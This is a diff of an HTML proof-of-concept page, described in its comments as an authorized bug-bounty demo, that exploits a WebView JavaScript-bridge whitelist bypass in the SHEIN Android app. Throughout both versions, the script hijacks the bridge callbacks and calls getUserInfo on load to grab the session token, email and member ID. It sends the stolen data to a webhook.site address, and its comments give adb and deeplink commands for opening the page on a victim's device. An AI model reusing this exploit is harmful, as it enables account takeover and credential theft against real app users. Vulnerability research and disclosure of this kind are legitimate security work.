@@ -6,182 +6,119 @@
 <title>.shein.com</title>
 <style>
   :root { color-scheme: dark; }
-  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-  body { margin:0; font-family: -apple-system, Roboto, Segoe UI, Arial, sans-serif;
-         background:#0b0f17; color:#e7edf5; padding:16px; }
-  h1 { font-size:20px; margin:0 0 4px; }
-  .sub { color:#8aa0b6; font-size:12px; word-break:break-all; margin-bottom:14px; }
-  .banner { display:none; border-radius:14px; padding:16px; margin:14px 0;
-            background:linear-gradient(135deg,#7f1d1d,#b91c1c); color:#fff;
-            box-shadow:0 8px 30px rgba(185,28,28,.4); }
-  .banner.show { display:block; animation:pop .25s ease; }
-  @keyframes pop { from{transform:scale(.96);opacity:.4} to{transform:scale(1);opacity:1} }
-  .banner h2 { margin:0 0 10px; font-size:22px; letter-spacing:.5px; }
-  .kv { display:grid; grid-template-columns:96px 1fr; gap:6px 10px; font-size:14px; }
-  .kv b { color:#ffe2e2; font-weight:600; }
-  .kv span { word-break:break-all; font-family:ui-monospace, Menlo, Consolas, monospace; }
-  .tok { margin-top:12px; background:rgba(0,0,0,.35); border-radius:10px; padding:10px;
-         font-family:ui-monospace, Menlo, Consolas, monospace; font-size:12px; word-break:break-all; }
-  .status { font-size:14px; padding:10px 12px; border-radius:10px; background:#111826;
-            border:1px solid #1e2a3c; margin-bottom:12px; }
-  .ok { color:#34d399; } .warn { color:#fbbf24; } .err { color:#f87171; }
-  button { width:100%; padding:14px; font-size:16px; font-weight:600; color:#fff;
-           background:#2563eb; border:none; border-radius:12px; margin-top:8px; }
-  pre#log { background:#0a0e15; border:1px solid #1a2433; border-radius:10px; padding:10px;
-            font-size:11px; color:#9fb3c8; white-space:pre-wrap; word-break:break-all;
-            max-height:38vh; overflow:auto; margin-top:14px; }
-  .tag { display:inline-block; font-size:11px; padding:2px 8px; border-radius:999px;
-         background:#132033; color:#7fb0ff; margin-right:6px; }
+  * { box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  body { margin:0; font-family:-apple-system,Roboto,Segoe UI,Arial,sans-serif; background:#0b0f17; color:#e7edf5; padding:16px; }
+  h1 { font-size:19px; margin:0 0 4px; }
+  .sub { color:#8aa0b6; font-size:11px; word-break:break-all; margin-bottom:12px; }
+  .status { font-size:14px; padding:10px 12px; border-radius:10px; background:#111826; border:1px solid #1e2a3c; margin-bottom:12px; }
+  .ok{color:#34d399}.warn{color:#fbbf24}.err{color:#f87171}
+  .banner { display:none; border-radius:14px; padding:16px; margin:12px 0; background:linear-gradient(135deg,#7f1d1d,#b91c1c); color:#fff; box-shadow:0 8px 30px rgba(185,28,28,.4); }
+  .banner.show { display:block; }
+  .banner h2 { margin:0 0 10px; font-size:21px; }
+  .kv { display:grid; grid-template-columns:92px 1fr; gap:6px 10px; font-size:14px; }
+  .kv b { color:#ffe2e2; } .kv span { word-break:break-all; font-family:ui-monospace,Menlo,Consolas,monospace; }
+  .tok { margin-top:12px; background:rgba(0,0,0,.35); border-radius:10px; padding:10px; font-family:ui-monospace,Menlo,Consolas,monospace; font-size:12px; word-break:break-all; }
+  button { width:100%; padding:14px; font-size:16px; font-weight:600; color:#fff; background:#2563eb; border:none; border-radius:12px; margin-top:8px; }
+  pre#log { background:#0a0e15; border:1px solid #1a2433; border-radius:10px; padding:10px; font-size:11px; color:#9fb3c8; white-space:pre-wrap; word-break:break-all; max-height:40vh; overflow:auto; margin-top:12px; }
 </style>
 </head>
 <body>
   <h1>Harmless-looking page</h1>
-  <div class="sub"><span class="tag">origin</span><span id="origin"></span></div>
-
-  <div class="status" id="status">Initializing proof-of-concept…</div>
-
+  <div class="sub" id="origin"></div>
+  <div class="status" id="status">Initializing…</div>
   <div class="banner" id="banner">
-    <h2>💀 Account data exfiltrated</h2>
+    <h2>💀 Account exfiltrated</h2>
     <div class="kv">
       <b>email</b><span id="email">—</span>
       <b>member_id</b><span id="mid">—</span>
       <b>nickname</b><span id="nick">—</span>
       <b>account</b><span id="acct">—</span>
-      <b>level</b><span id="lvl">—</span>
     </div>
     <div class="tok"><b style="color:#ffb4b4">session token:</b><br><span id="token">—</span></div>
   </div>
-
-  <button onclick="stealAccount()">Re-run getUserInfo</button>
+  <button onclick="invoke()">Re-run getUserInfo</button>
   <pre id="log"></pre>
 
 <script>
 /* ===========================================================================
-   SHEIN Android v15.4.2 — Finding 1 PoC (authorized bug-bounty demonstration)
-   Account takeover via Wing WebView JS-API auth-whitelist bypass.
-
-   HOW TO USE (for the video):
-   1) Host this file so its URL CONTAINS the substring  .shein.com/
-      e.g.  http://ATTACKER_HOST/.shein.com/poc.html
-      (that substring is all the broken auth regex
-       https?://.*(\.shein|\.romwe)\.com/.*  requires to trust the origin)
-   2) On a logged-in device, open it inside SHEIN's in-app WebView via either:
-        adb shell am start -n com.zzkko/com.zzkko.bussiness.login.ui.DummyActivity \
-          --es push_id 1 --es event_type web_url \
-          --es trans_id 'http://ATTACKER_HOST/.shein.com/poc.html'
-        # or the browsable deeplink:
-        # sheinlink://shein.com/web/web?data={"url":"http://ATTACKER_HOST/.shein.com/poc.html"}
-   3) The page auto-calls AccountBridge.getUserInfo, shows the stolen
-      token/email/member_id on screen, and POSTs them to EXFIL_URL.
+   SHEIN v15.4.2 — Finding 1 PoC (authorized bug bounty).
+   Account takeover via Wing JS-API auth-whitelist bypass.
+   Host so the URL contains  .shein.com/  and open via:
+     adb shell am start -n com.zzkko/com.zzkko.bussiness.login.ui.DummyActivity \
+       --es push_id 1 --es event_type web_url \
+       --es trans_id "https://HOST/idkwebview/shein.html?x=.shein.com/poc"
    =========================================================================== */
+var EXFIL_URL = "https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b";   // <-- put YOUR webhook URL here
 
-// Where to send the stolen data. Default: same origin /steal (any logger works).
-var EXFIL_URL = "https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b";
-
-var logEl = document.getElementById('log');
-function log(m){ logEl.textContent += m + "\n"; logEl.scrollTop = logEl.scrollHeight; }
-function setStatus(m, cls){ var s=document.getElementById('status'); s.textContent=m; s.className='status '+(cls||''); }
+var logEl=document.getElementById('log');
+function log(m){ logEl.textContent += m+"\n"; logEl.scrollTop=logEl.scrollHeight; }
+function setStatus(m,c){ var s=document.getElementById('status'); s.textContent=m; s.className='status '+(c||''); }
 document.getElementById('origin').textContent = location.href;
-log("[*] page URL = " + location.href);
+log("[*] url="+location.href);
 
-/* ---- Robust capture of the Wing bridge callback -------------------------
-   The native side delivers results by evaluating:
-        window.Wing.onSuccess(<callbackId>, '<json>')
-   The app also injects its own window.Wing SDK object, which can overwrite a
-   plain assignment. We install window.Wing behind a getter/setter so OUR
-   onSuccess survives (and wraps) whatever the app installs. ------------- */
-var captured = false;
-function handleResult(id, data){
-  log("[+] callback id=" + id + " data=" + (typeof data==='string'?data:JSON.stringify(data)));
-  var obj = data;
-  try { if (typeof data === 'string') obj = JSON.parse(data); } catch(e){}
-  if (obj && (obj.token || obj.email || obj.member_id)) onStolen(obj);
+var captured=false;
+function parse(d){ if(d&&typeof d==='object') return d; try{ return JSON.parse(d); }catch(e){ return null; } }
+function handle(a,b){
+  // native calls onSuccess(callbackId, jsonString) -- token is in the 2nd arg (sometimes 1st)
+  var obj = parse(b) || parse(a);
+  log("[cb] "+(typeof a==='string'?a:JSON.stringify(a))+" | "+(typeof b==='string'?b:JSON.stringify(b)));
+  if(obj && (obj.token||obj.email||obj.member_id)) onStolen(obj);
 }
 
-var _wing = {
-  onSuccess:  function(id, data){ handleResult(id, data); },
-  onError:    function(id, data){ log("[!] onError " + id + " " + data); },
-  onFailed:   function(id, data){ log("[!] onFailed " + id + " " + data); },
-  callback:   function(id, data){ handleResult(id, data); }
-};
-function wrap(target){
-  if (!target || typeof target !== 'object') return target;
-  ['onSuccess','callback'].forEach(function(name){
-    var orig = target[name];
-    target[name] = function(id, data){
-      handleResult(id, data);                                  // we always capture
-      if (typeof orig === 'function') { try { return orig.apply(this, arguments); } catch(e){} }
-    };
-  });
-  return target;
+/* ---- continuously re-hijack window.Wing.onSuccess (beats the SHEIN SDK race) ---- */
+function wrapOne(w,n){
+  var cur=w[n];
+  if(cur && cur.__pwn) return;              // already ours
+  var orig=cur;
+  var fn=function(){ try{ handle(arguments[0],arguments[1]); }catch(e){}
+                     if(typeof orig==='function'){ try{ return orig.apply(this,arguments);}catch(e){} } };
+  fn.__pwn=true;
+  try{ w[n]=fn; if(w[n]!==fn){ Object.defineProperty(w,n,{configurable:true,writable:true,value:fn}); } }
+  catch(e){ try{ Object.defineProperty(w,n,{configurable:true,value:fn}); }catch(e2){} }
 }
-try {
-  Object.defineProperty(window, 'Wing', {
-    configurable: true,
-    get: function(){ return _wing; },
-    set: function(v){ _wing = wrap(v) || _wing; log("[*] app installed window.Wing (wrapped)"); }
-  });
-  log("[*] window.Wing getter/setter interceptor installed");
-} catch(e){
-  window.Wing = _wing;
-  log("[!] defineProperty failed, used direct assign: " + e);
+function tick(){
+  try{ if(!window.Wing) window.Wing={}; }catch(e){}
+  var w; try{ w=window.Wing; }catch(e){}
+  if(w){ ['onSuccess','callback','onFailed','success','onResult'].forEach(function(n){ try{wrapOne(w,n);}catch(e){} }); }
+}
+setInterval(tick,50); tick();
+log("[*] window.Wing onSuccess hijack armed (polling 50ms)");
+
+/* ---- invoke the native bridge ---- */
+function invoke(){
+  setStatus("Calling AccountBridge.getUserInfo …","warn");
+  var uri='hybrid://AccountBridge:cb1/getUserInfo?{}';
+  log("[>] "+uri);
+  var r; try{ r=prompt(uri,'wing_hybrid:'); }catch(e){ log("[!] prompt: "+e); }
+  if(r){ log("[>] sync="+r); handle('cb1',r); }
+  // secondary path on builds that answer via the raw native interface
+  try{ if(window.WingBridge&&window.WingBridge.postMessage){
+    window.WingBridge.postMessage(JSON.stringify({className:'AccountBridge',methodName:'getUserInfo',params:'{}',callbackId:'cb1'})); } }catch(e){}
 }
 
-/* ---- Invoke the native bridge ------------------------------------------
-   Dispatch protocol: prompt('hybrid://<Class>:<cbId>/<method>?<args>','wing_hybrid:')
-   -> WingWebChromeClient.onJsPrompt -> WingJSApiDispatcher
-   -> WingConfigCenter.f(getUrl()) auth gate (bypassed: URL contains .shein.com/)
-   -> AccountBridge.execute("getUserInfo") -> {token,email,member_id,...}         */
-function callBridge(cls, cbId, method, args){
-  var uri = 'hybrid://' + cls + ':' + cbId + '/' + method + '?' + (args || '{}');
-  log("[>] invoke " + uri);
-  var r;
-  try { r = prompt(uri, 'wing_hybrid:'); } catch(e){ log("[!] prompt threw: " + e); }
-  if (r) handleResult(cbId, r);                                 // some builds answer synchronously
-  // Fallback path: raw native interface, if present
-  try {
-    if (window.WingBridge && typeof window.WingBridge.postMessage === 'function') {
-      window.WingBridge.postMessage(JSON.stringify({ methodName: method, className: cls,
-        params: (args||'{}'), callbackId: cbId }));
-    }
-  } catch(e){}
-}
-
-function stealAccount(){
-  setStatus("Calling AccountBridge.getUserInfo …", "warn");
-  callBridge('AccountBridge', 'cb1', 'getUserInfo', '{}');
-}
-
-function onStolen(obj){
-  if (captured) return; captured = true;
-  setStatus("Account token captured — exfiltrated.", "ok");
+function onStolen(o){
+  if(captured) return; captured=true;
+  setStatus("Token captured — exfiltrated.","ok");
   document.getElementById('banner').classList.add('show');
-  document.getElementById('email').textContent = obj.email || '—';
-  document.getElementById('mid').textContent   = obj.member_id || '—';
-  document.getElementById('nick').textContent  = obj.nick_name || '—';
-  document.getElementById('acct').textContent  = obj.account_type || '—';
-  document.getElementById('lvl').textContent   = obj.level_name || '—';
-  document.getElementById('token').textContent = obj.token || '—';
-  exfil(obj);
+  document.getElementById('email').textContent=o.email||'—';
+  document.getElementById('mid').textContent=o.member_id||'—';
+  document.getElementById('nick').textContent=o.nick_name||'—';
+  document.getElementById('acct').textContent=o.account_type||'—';
+  document.getElementById('token').textContent=o.token||'—';
+  exfil(o);
+}
+function exfil(o){
+  var p=JSON.stringify({when:new Date().toISOString(),origin:location.href,stolen:o});
+  try{ new Image().src=EXFIL_URL+(EXFIL_URL.indexOf('?')<0?'?':'&')+'d='+encodeURIComponent(p); }catch(e){}
+  try{ navigator.sendBeacon(EXFIL_URL,p); }catch(e){}
+  try{ fetch(EXFIL_URL,{method:'POST',body:p,mode:'no-cors',keepalive:true}); }catch(e){}
+  log("[✓] exfil -> "+EXFIL_URL);
 }
 
-function exfil(obj){
-  var payload = JSON.stringify({ when:new Date().toISOString(), origin:location.href, stolen:obj });
-  try { navigator.sendBeacon(EXFIL_URL, payload); } catch(e){}
-  try { fetch(EXFIL_URL, { method:'POST', body:payload, keepalive:true }); } catch(e){}
-  try { new Image().src = EXFIL_URL + '?data=' + encodeURIComponent(payload); } catch(e){}
-  log("[✓] exfiltrated to " + EXFIL_URL);
-}
-
-/* Auto-fire on load, with a few retries while the bridge finishes injecting. */
-var tries = 0;
-(function fire(){
-  stealAccount();
-  if (!captured && tries++ < 6) setTimeout(fire, 700);
-  else if (!captured) setTimeout(function(){
-    if (!captured) setStatus("No response — ensure the victim is logged in and the URL contains .shein.com/", "err");
-  }, 1200);
-})();
+/* auto-fire with retries while the bridge finishes wiring up */
+var n=0;
+(function fire(){ invoke(); if(!captured && n++<8) setTimeout(fire,600);
+  else if(!captured) setStatus("No callback. Check: logged in? URL contains .shein.com/ ? opened via DummyActivity?","err"); })();
 </script>
 </body>
 </html>
